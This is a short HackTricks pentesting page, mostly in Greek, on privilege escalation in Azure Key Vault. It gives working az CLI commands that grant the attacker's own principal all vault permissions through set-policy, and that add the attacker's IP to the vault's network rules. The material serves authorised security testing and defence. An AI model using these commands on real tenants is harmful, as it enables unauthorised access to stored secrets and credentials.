# Az - Key Vault Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Azure Key Vault

Για περισσότερες πληροφορίες σχετικά με αυτή την υπηρεσία, ελέγξτε:

{{#ref}}
../az-services/az-keyvault.md
{{#endref}}

### `Microsoft.KeyVault/vaults/write`

Ένας επιτιθέμενος με αυτή την άδεια θα είναι σε θέση να τροποποιήσει την πολιτική ενός key vault (το key vault πρέπει να χρησιμοποιεί πολιτικές πρόσβασης αντί για RBAC).
```bash
# If access policies in the output, then you can abuse it
az keyvault show --name <vault-name>

# Get current principal ID
az ad signed-in-user show --query id --output tsv

# Assign all permissions
az keyvault set-policy \
--name <vault-name> \
--object-id <your-object-id> \
--key-permissions all \
--secret-permissions all \
--certificate-permissions all \
--storage-permissions all
```
### Τροποποίηση Περιορισμών Δικτύου

Ενδέχεται να έχετε αρκετές άδειες για να αποκτήσετε πρόσβαση σε ευαίσθητα δεδομένα (όπως η τιμή ενός μυστικού) αλλά δεν μπορείτε να έχετε πρόσβαση σε αυτό επειδή το key vault είναι περιορισμένο σε ένα συγκεκριμένο δίκτυο. Εάν έχετε την άδεια να τροποποιήσετε τους περιορισμούς δικτύου, μπορείτε να προσθέσετε τη διεύθυνση IP σας στη λίστα των επιτρεπόμενων διευθύνσεων IP.
```bash
# Get the current network restrictions
az keyvault network-rule list --name <vault-name>

# Add your IP to the list
az keyvault network-rule add --name <vault-name> --ip-address <your-ip>
```
{{#include ../../../banners/hacktricks-training.md}}
